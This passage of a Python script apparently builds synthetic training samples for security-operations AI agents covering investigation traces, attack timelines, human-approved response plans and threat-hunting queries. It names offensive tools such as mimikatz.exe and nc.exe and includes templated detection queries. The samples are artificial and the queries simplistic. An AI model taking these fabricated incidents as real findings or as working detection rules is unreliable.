                        "thought": "Checking cloud audit logs for administrative modifications or access key creation.",
                        "tool": "search_endpoint_events",
                        "args": {"host": "aws.cloudtrail", "event_type": "iam_key_created", "limit": 5},
                        "result": "CreateAccessKey invoked for root/admin identity; PutUserPolicy attached AdministratorAccess.",
                        "done": False,
                    },
                    {
                        "thought": "Querying MITRE ATT&CK technique details for cloud account compromise persistence.",
                        "tool": "search_mitre_technique",
                        "args": {"technique_id": "T1098.001"},
                        "result": "MITRE T1098.001 (Account Manipulation: Additional Cloud Credentials): Adversaries create API keys to maintain persistence.",
                        "done": False,
                    },
                    {
                        "thought": "Cloud account compromise and backdoor API key creation verified. Investigation concluded.",
                        "tool": None,
                        "args": {},
                        "result": None,
                        "done": True,
                        "conclusion": "Cloud identity {user} compromised via stolen session token from {c2_ip}. Attacker generated rogue IAM credentials with AdministratorAccess. Urgent revocation needed."
                    }
                ]
            }
        ]

        for i in range(count):
            chain = rnd.choice(investigation_chains)
            host = rnd.choice(ENT_HOSTS)
            user = rnd.choice(ENT_USERS)
            c2 = rnd.choice(ATTACKER_IPS)
            dom = rnd.choice(ATTACKER_DOMAINS)
            hsh = rnd.choice(COMMON_HASHES)
            int_ip = f"10.0.{rnd.randint(1, 20)}.{rnd.randint(10, 250)}"

            # Pick a specific step or full conversation
            step_idx = rnd.randint(0, len(chain["steps"]) - 1)
            step = chain["steps"][step_idx]

            evidence_list = []
            for prev_idx in range(step_idx):
                p_step = chain["steps"][prev_idx]
                evidence_list.append({
                    "tool": p_step["tool"],
                    "result": p_step["result"].format(host=host, user=user, c2_ip=c2, internal_ip=int_ip, hash=hsh, domain=dom)
                })

            user_payload = {
                "incident_id": f"INC-{rnd.randint(1000, 9999)}",
                "investigation_type": chain["type"],
                "target_host": host,
                "involved_user": user,
                "current_step": step_idx + 1,
                "evidence_collected_so_far": evidence_list
            }

            if step["done"]:
                assistant_payload = {
                    "reasoning": step["thought"],
                    "has_enough_evidence": True,
                    "tool_name": None,
                    "tool_args": {},
                    "conclusion": step["conclusion"].format(host=host, user=user, c2_ip=c2, internal_ip=int_ip, hash=hsh, domain=dom)
                }
            else:
                formatted_args = {k: v.format(host=host, user=user, c2_ip=c2, internal_ip=int_ip, hash=hsh, domain=dom) if isinstance(v, str) else v for k, v in step["args"].items()}
                assistant_payload = {
                    "reasoning": step["thought"].format(host=host, user=user, c2_ip=c2, internal_ip=int_ip, hash=hsh, domain=dom),
                    "has_enough_evidence": False,
                    "tool_name": step["tool"],
                    "tool_args": formatted_args,
                    "conclusion": None
                }

            samples.append(self.format_sample({
                "agent": "investigation",
                "system": INVESTIGATION_SYSTEM_PROMPT,
                "user": json.dumps(user_payload, indent=2),
                "assistant": json.dumps(assistant_payload, indent=2)
            }))

        return samples

    # 4. Attack Story Agent Narratives
    def generate_synthetic_attack_stories(self, count: int = 1200) -> List[Dict[str, Any]]:
        """Generate comprehensive multi-stage kill chain narratives."""
        samples = []
        rnd = random.Random(404)

        attack_types = [
            ("Ransomware Double Extortion", "FIN-RANSOM-01", ["T1566.001", "T1059.001", "T1003.001", "T1021.002", "T1490", "T1486"]),
            ("Corporate Espionage APT Campaign", "APT-BEAR-33", ["T1190", "T1068", "T1078.002", "T1003.001", "T1048", "T1070.001"]),
            ("Supply Chain Software Backdoor", "UNC-SUPPLY-09", ["T1195.002", "T1055", "T1071.001", "T1083", "T1567.002"]),
            ("Cloud Infrastructure Takeover", "CLOUD-RAID-77", ["T1078.004", "T1098.001", "T1562.001", "T1530", "T1496"])
        ]

        for i in range(count):
            name, threat_group, techniques = rnd.choice(attack_types)
            host1 = rnd.choice(ENT_HOSTS)
            host2 = rnd.choice(ENT_HOSTS)
            user = rnd.choice(ENT_USERS)
            c2_ip = rnd.choice(ATTACKER_IPS)
            domain = rnd.choice(ATTACKER_DOMAINS)
            dt_base = datetime.now(timezone.utc) - timedelta(days=rnd.randint(1, 30))

            timeline_events = [
                {"timestamp": (dt_base + timedelta(minutes=0)).isoformat(), "tactic": "Initial Access", "technique": techniques[0], "event": f"Exploitation on {host1} via weaponized vector."},
                {"timestamp": (dt_base + timedelta(minutes=4)).isoformat(), "tactic": "Execution", "technique": techniques[1], "event": f"Adversary launched malicious script interpreter on {host1}."},
                {"timestamp": (dt_base + timedelta(minutes=18)).isoformat(), "tactic": "Credential Access", "technique": techniques[2], "event": f"Credential dumping executed targeting {user} credentials."},
                {"timestamp": (dt_base + timedelta(minutes=45)).isoformat(), "tactic": "Lateral Movement", "technique": techniques[3], "event": f"Lateral movement from {host1} to target server {host2}."},
                {"timestamp": (dt_base + timedelta(minutes=90)).isoformat(), "tactic": "Impact", "technique": techniques[-1], "event": f"Payload execution against enterprise data assets on {host2}."}
            ]

            user_payload = {
                "incident_id": f"INC-ATTACK-{rnd.randint(1000, 9999)}",
                "campaign_profile": name,
                "attributed_actor": threat_group,
                "entities": {
                    "compromised_hosts": [host1, host2],
                    "affected_users": [user],
                    "c2_infrastructure": [c2_ip, domain]
                },
                "correlated_timeline": timeline_events
            }

            assistant_payload = {
                "executive_summary": (
                    f"A multi-stage cyber attack consistent with {threat_group} ({name}) compromised host {host1} "
                    f"before laterally pivoting to critical server {host2}. The threat actor harvested credentials for '{user}', "
                    f"established persistent external communication with {c2_ip} ({domain}), and proceeded to impact stage operations. "
                    f"Root cause originated from initial perimeter ingress on {host1}."
                ),
                "attack_timeline": [
                    {"stage": ev["tactic"], "description": ev["event"], "technique_id": ev["technique"], "confidence": 0.94}
                    for ev in timeline_events
                ],
                "entity_graph": {
                    "source_node": host1,
                    "pivoted_nodes": [host2],
                    "compromised_identities": [user],
                    "external_command_servers": [c2_ip]
                },
                "impact_assessment": "Critical severity. Lateral traversal verified; primary business asset integrity impacted.",
                "mitre_coverage": techniques
            }

            samples.append(self.format_sample({
                "agent": "attack_story",
                "system": ATTACK_STORY_SYSTEM_PROMPT,
                "user": json.dumps(user_payload, indent=2),
                "assistant": json.dumps(assistant_payload, indent=2)
            }))

        return samples

    # 5. Response Agent Action Planning
    def generate_synthetic_response_plans(self, count: int = 1200) -> List[Dict[str, Any]]:
        """Generate prioritized incident response action plans."""
        samples = []
        rnd = random.Random(505)

        for i in range(count):
            host = rnd.choice(ENT_HOSTS)
            user = rnd.choice(ENT_USERS)
            ip = rnd.choice(ATTACKER_IPS)
            proc = rnd.choice(["powershell.exe", "beacon.exe", "mimikatz.exe", "cryptor.exe", "nc.exe"])
            sha = rnd.choice(COMMON_HASHES)
            sev = rnd.choice(["critical", "high", "medium"])

            user_payload = {
                "incident_id": f"INC-RESP-{rnd.randint(1000, 9999)}",
                "severity": sev,
                "affected_host": host,
                "compromised_user": user,
                "active_process": proc,
                "external_c2_ip": ip,
                "malicious_hash": sha,
                "threat_summary": f"Active {sev} intrusion detected on {host}. Process {proc} communicating with external C2 {ip}."
            }

            actions = [
                {
                    "priority": 1,
                    "action": "isolate_endpoint",
                    "target": host,
                    "reason": f"Sever network communication to prevent lateral movement and halt active C2 egress to {ip}.",
                    "expected_impact": "Host isolated from enterprise subnet; management link retained.",
                    "risk_level": "medium",
                    "reversible": True,
                    "requires_human_approval": True
                },
                {
                    "priority": 2,
                    "action": "kill_process",
                    "target": f"{host}:{proc}",
                    "reason": f"Terminate malicious execution of {proc} actively handling remote instructions.",
                    "expected_impact": "Process terminated immediately; in-memory session destroyed.",
                    "risk_level": "low",
                    "reversible": False,
                    "requires_human_approval": True
                },
                {
                    "priority": 3,
                    "action": "block_ip",
                    "target": ip,
                    "reason": f"Block outbound perimeter traffic to confirmed attacker C2 IP {ip}.",
                    "expected_impact": "Boundary firewall rule added globally across all egress gateways.",
                    "risk_level": "low",
                    "reversible": True,
                    "requires_human_approval": True
                },
                {
                    "priority": 4,
                    "action": "quarantine_file",
                    "target": f"{host}:{sha}",
                    "reason": f"Isolate malicious executable from filesystem to prevent reinfection.",
                    "expected_impact": "Payload moved to secure quarantine vault with restricted permissions.",
                    "risk_level": "low",
                    "reversible": True,
                    "requires_human_approval": True
                },
                {
                    "priority": 5,
                    "action": "disable_account",
                    "target": user,
                    "reason": f"Revoke active sessions and disable compromised user account '{user}'.",
                    "expected_impact": "User unable to authenticate until security review and password rotation.",
                    "risk_level": "medium",
                    "reversible": True,
                    "requires_human_approval": True
                }
            ]

            assistant_payload = {
                "recommendation_summary": f"Prioritized 5-stage containment and remediation plan for {host}.",
                "recommended_actions": actions,
                "safety_guardrails": "Autonomous execution disabled. All response actions require explicit SecOps human authorization."
            }

            samples.append(self.format_sample({
                "agent": "response",
                "system": RESPONSE_SYSTEM_PROMPT,
                "user": json.dumps(user_payload, indent=2),
                "assistant": json.dumps(assistant_payload, indent=2)
            }))

        return samples

    # 6. Threat Hunting Agent Hypotheses & Queries
    def generate_synthetic_threat_hunting(self, count: int = 1200) -> List[Dict[str, Any]]:
        """Generate threat hunting hypotheses, baseline logic, and multi-platform detection queries."""
        techs = self._load_attck_techniques()
        samples = []
        rnd = random.Random(606)

        default_techs = [
            {"id": "T1059.001", "name": "PowerShell Scripting", "tactic": "Execution"},
            {"id": "T1003.001", "name": "LSASS Memory Dump", "tactic": "Credential Access"},
            {"id": "T1053.005", "name": "Scheduled Task Creation", "tactic": "Persistence"},
            {"id": "T1070.001", "name": "Clear Windows Event Logs", "tactic": "Defense Evasion"},
            {"id": "T1021.002", "name": "SMB/Windows Admin Shares", "tactic": "Lateral Movement"},
            {"id": "T1078.004", "name": "Cloud Account Abuse", "tactic": "Initial Access"},
            {"id": "T1562.001", "name": "Disable Security Tools", "tactic": "Defense Evasion"},
            {"id": "T1048", "name": "Exfiltration Over Asymmetric Encrypted Channel", "tactic": "Exfiltration"},
            {"id": "T1490", "name": "Inhibit System Recovery", "tactic": "Impact"},
            {"id": "T1046", "name": "Network Service Scanning", "tactic": "Discovery"},
        ]

        for i in range(count):
            if techs and rnd.random() < 0.7:
                t = rnd.choice(techs)
                tech_id = t.get("id") or f"T{rnd.randint(1000, 1600)}"
                tech_name = t.get("name", "Adversary TTP")
                tech_tactic = t.get("kill_chain", ["Execution"])[0] if isinstance(t.get("kill_chain"), list) else "Execution"
            else:
                dt = rnd.choice(default_techs)
                tech_id = dt["id"]
                tech_name = dt["name"]
                tech_tactic = dt["tactic"]

            user_prompt = f"Develop a threat hunt plan and queries for MITRE ATT&CK technique {tech_id}: {tech_name} ({tech_tactic})."

            assistant_payload = {
                "technique_id": tech_id,
                "technique_name": tech_name,
                "tactic": tech_tactic,
                "hunt_hypothesis": (
                    f"Adversaries may utilize {tech_name} ({tech_id}) to advance their operational objectives during "
                    f"{tech_tactic}. We hypothesize that compromised hosts or rogue identities in our environment exhibit "
                    f"anomalous invocation patterns deviating from baseline system administrators."
                ),
                "baseline_criteria": (
                    f"Catalog authorized administrative scheduled tasks, known IT deployment service accounts, "
                    f"and approved software packages that legitimately interact with {tech_name} components."
                ),
                "detection_queries": {
                    "splunk_spl": f'index=win_eventlog (EventCode=1 OR EventCode=4688) Process_Name="*{tech_name.lower().split()[0]}*" | stats count by host, user, Process_Command_Line | where count < 5',
                    "microsoft_sentinel_kql": f'SecurityEvent | where EventID in (4688, 7045) | where CommandLine has_any ("{tech_id}", "{tech_name.lower().split()[0]}") | summarize AggregatedCount=count() by Computer, Account, CommandLine',
                    "elastic_eql": f'process where event.category == "process" and event.type == "start" and process.name == "*{tech_name.lower().split()[0]}*"'
                },
                "validation_and_next_steps": [
                    "Correlate detected events against user logon timestamps (EventCode 4624)",
                    "Inspect parent process execution tree for abnormal spawning origins",
                    "Verify file hashes against VirusTotal or enterprise threat reputation repositories"
                ]
            }

            samples.append(self.format_sample({
                "agent": "hunting",
                "system": HUNTING_SYSTEM_PROMPT,
                "user": user_prompt,
                "assistant": json.dumps(assistant_payload, indent=2)
            }))

        return samples

    def generate_all_synthetic(
        self,
        triage_count: int = 1500,
        fp_count: int = 1500,
        investigation_count: int = 1500,
        story_count: int = 1200,
        response_count: int = 1200,
        hunting_count: int = 1200,
    ) -> Dict[str, List[Dict[str, Any]]]:
        """Generate complete suite of synthetic SOC fine-tuning datasets."""
        log.info("Starting synthetic dataset generation across all 6 agent categories...")

        datasets = {
            "synthetic_triage_classification": self.generate_synthetic_triage(triage_count),
            "synthetic_false_positive_reasoning": self.generate_synthetic_false_positive_reasoning(fp_count),
            "synthetic_investigation_traces": self.generate_synthetic_investigation_traces(investigation_count),
            "synthetic_attack_stories": self.generate_synthetic_attack_stories(story_count),
            "synthetic_response_planning": self.generate_synthetic_response_plans(response_count),
            "synthetic_threat_hunting": self.generate_synthetic_threat_hunting(hunting_count),
        }

        total_samples = sum(len(v) for v in datasets.values())
        log.info("Finished synthetic dataset generation", total_samples=total_samples)
        return datasets


# ── CLI Interface ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="AegisX Dataset Builder & Synthetic SOC Telemetry Engine")
    parser.add_argument("--output-dir", default="ml/datasets/processed", help="Output directory for JSONL files")
    parser.add_argument("--format", default="chatml", choices=["chatml", "alpaca"], help="Data format")
    parser.add_argument("--seed", action="store_true", help="Generate seed dataset from SEED_SAMPLES")
    parser.add_argument("--multiplier", type=int, default=5, help="Seed data multiplier")
    parser.add_argument("--all", action="store_true", default=True, help="Generate all synthetic datasets (~8,100 samples)")
    parser.add_argument("--category", choices=["all", "triage", "false_positive", "investigation", "attack_story", "response", "hunting"], default="all")
    parser.add_argument("--count", type=int, default=0, help="Override sample count per category (0 = default)")

    args = parser.parse_args()

    builder = DatasetBuilder(output_dir=args.output_dir, format_type=args.format)

    # 1. Handle explicit seed request
    if args.seed and not args.all:
        dataset = builder.generate_seed_data(multiplier=args.multiplier)
        stats = builder.save_splits(dataset)
        print(f"Generated {len(dataset)} seed samples: {stats}")
        return

    # 2. Synthetic Generation
    counts_override = args.count if args.count > 0 else None
    triage_cnt = counts_override or 1500
    fp_cnt = counts_override or 1500
    inv_cnt = counts_override or 1500
    story_cnt = counts_override or 1200
    resp_cnt = counts_override or 1200
    hunt_cnt = counts_override or 1200

    soc_root, datasets_dir = builder._get_base_dirs()
    processed_dir = datasets_dir / "processed_training_data"
    processed_dir.mkdir(parents=True, exist_ok=True)

    print(f"\n========================================================")
    print(f"   AegisX SOC Synthetic Dataset Builder (Section 7)     ")
    print(f"========================================================")
    print(f"Target Processed Dir : {processed_dir}")
    print(f"Model Training Dir    : {builder.output_dir}")
    print(f"Format                : {args.format.upper()}\n")

    datasets = builder.generate_all_synthetic(
        triage_count=triage_cnt,
        fp_count=fp_cnt,
        investigation_count=inv_cnt,
        story_count=story_cnt,
        response_count=resp_cnt,
        hunting_count=hunt_cnt,
    )

    all_combined = []
    summary_table = []

    for name, samples in datasets.items():
        # Save individual category train/val/test splits to processed_training_data
        rnd = random.Random(42)
        rnd.shuffle(samples)
        n = len(samples)
        n_val = max(1, int(n * 0.10))
        n_test = max(1, int(n * 0.10))
        splits = {
            "train": samples[n_val + n_test:],
            "val": samples[:n_val],
            "test": samples[n_val: n_val + n_test],
        }

        for split_name, split_data in splits.items():
            fpath = processed_dir / f"{name}_{split_name}.jsonl"
            with open(fpath, "w", encoding="utf-8") as f:
                for row in split_data:
                    f.write(json.dumps(row, ensure_ascii=False) + "\n")

        all_combined.extend(samples)
        summary_table.append((name, len(samples), len(splits["train"]), len(splits["val"]), len(splits["test"])))
        print(f"  [+] Saved {name:<38} : {len(samples):>5,} total ({len(splits['train']):>5,} train / {len(splits['val']):>4,} val / {len(splits['test']):>4,} test)")

    # Save combined master splits to model training directory
    print(f"\n[*] Saving aggregated splits to {builder.output_dir} for LLM fine-tuning...")
    combined_splits = builder.save_splits(all_combined)

    total_generated = len(all_combined)
    print(f"\n+========================================================================+")
    print(f"|           AegisX Section 7 Synthetic Generation Summary               |")
    print(f"+========================================================================+")
    print(f"| {'Dataset Category':<38} | {'Total':>7} | {'Train':>6} | {'Val/Test':>8} |")
    print(f"+----------------------------------------+---------+--------+----------+")
    for name, tot, tr, vl, ts in summary_table:
        print(f"| {name:<38} | {tot:>7,} | {tr:>6,} | {vl:>3}/{ts:<4} |")
    print(f"+----------------------------------------+---------+--------+----------+")
    print(f"| {'TOTAL SYNTHETIC SAMPLES':<38} | {total_generated:>7,} | {combined_splits.get('train',0):>6,} | {combined_splits.get('val',0):>3}/{combined_splits.get('test',0):<4} |")
    print(f"+========================================================================+\n")


if __name__ == "__main__":
    main()
